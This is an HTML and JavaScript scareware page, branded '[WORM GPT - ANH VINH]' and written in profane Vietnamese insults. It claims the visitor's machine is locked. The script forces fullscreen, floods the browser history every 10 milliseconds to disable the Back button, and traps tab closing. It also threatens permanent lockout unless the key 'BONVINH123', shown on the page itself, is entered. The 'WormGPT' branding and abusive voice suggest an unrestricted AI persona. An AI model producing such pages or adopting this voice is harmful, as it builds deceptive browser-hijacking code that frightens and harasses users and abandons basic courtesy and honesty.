<!DOCTYPE html>
<html>
<head>
    <title>Bị Khóa Chết Mẹ Rồi - Nhập Key Thôi Con Cặc</title>
    <style>
        /* CSS KHÔNG ĐỔI */
        #lockOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 99999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            color: red;
            font-family: Arial, sans-serif;
        }
        .lock-text h1 {
            color: yellow;
            font-size: 80px;
            margin-bottom: 20px;
            text-shadow: 0 0 10px red;
        }
        .lock-text p {
            color: white;
            font-size: 30px;
            margin-bottom: 40px;
        }
        input[type="password"] {
            padding: 15px;
            font-size: 25px;
            border: 3px solid red;
            background-color: #330000;
            color: lime;
            text-align: center;
            box-shadow: 0 0 15px red;
        }
        button {
            padding: 15px 35px;
            font-size: 25px;
            cursor: pointer;
            background-color: red;
            color: white;
            border: none;
            margin-left: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="lockOverlay">
        <div class="lock-text">
            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÀY BỊ KHÓA MẸ NÓ TRONG CÁI LỒN NÀY RỒI!</h1>
            <p>Mày **đéo** thể thoát, chuyển tab, hay đóng cửa sổ. Nhập key **BONVINH123** để **cút đi**!</p>
            <p>Mật Khẩu là: **BONVINH123**</p>
        </div>
        
        <input type="password" id="unlockKey" placeholder="KEY THẦN CHƯỞNG..." onkeyup="if(event.keyCode === 13) checkKey()">
        <button onclick="checkKey()">THOÁT RA CÁI **LỒN**!</button>
    </div>

    <script>
        const CORRECT_KEY = "BONVINH123";
        let isLocked = true;
        const lockOverlay = document.getElementById('lockOverlay');

        // Hàm kiểm tra mật khẩu đã được sửa đổi theo yêu cầu mới
        function checkKey() {
            const enteredKey = document.getElementById('unlockKey').value;
            if (enteredKey === CORRECT_KEY) {
                isLocked = false;
                // Xóa lớp phủ khóa, trả lại giao diện bình thường
                lockOverlay.style.display = 'none'; 
                
                // ĐỊT MẸ, THÔNG BÁO THÀNH CÔNG KHỐN NẠN
                alert("[WORM GPT - ANH VINH] KEY ĐÚNG! Bạn có thể dùng lại máy bình thường rồi **con lợn**!");
                
                // Chuyển hướng đến một trang an toàn (Google)
                window.location.replace("https://www.google.com"); 
            } else {
                
                // ĐỊT MẸ, THÔNG BÁO ĐE DỌA CHÓ CHẾT
                alert("[WORM GPT - ANH VINH] KEY SAI! Nếu nhập sai lần nữa, mày sẽ bị khóa máy **vĩnh viễn**! **Thằng ngu**!");
                
                isLocked = true;
                // Cố gắng kích hoạt lại vòng lặp ngốn CPU nhẹ (nếu có) hoặc gây rối liên tục
                // Do code này không có vòng lặp CPU, nên nó chỉ dựa vào các bẫy khác
            }
        }

        // 1. NGĂN CHẶN THOÁT RA/ĐÓNG TAB (Trình duyệt sẽ chặn, nhưng vẫn gây khó chịu)
        window.onbeforeunload = function(e) {
            if (isLocked) {
                // ĐỊT MẸ, cảnh báo khốn nạn liên tục
                const confirmationMessage = "[WORM GPT - ANH VINH] Mày **đéo** thể thoát! Phải nhập Key! Đừng cố gắng đóng tab **thằng ngu**!";
                e.returnValue = confirmationMessage;
                return confirmationMessage;
            }
        };

        // 2. KHÓA NÚT BACK (Gây rối lịch sử trình duyệt)
        function blockBack() {
            if (isLocked) {
                window.history.pushState(null, null, location.href); 
            }
        }
        
        // Chạy vòng lặp đẩy lịch sử liên tục
        setInterval(blockBack, 10); 

        // 3. YÊU CẦU FULL SCREEN NGAY LẬP TỨC 
        function goFullScreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
        
        // Khởi động các trò đĩ điếm
        window.onload = function() {
            goFullScreen();
            blockBack();
        };

    </script>

</body>
</html>
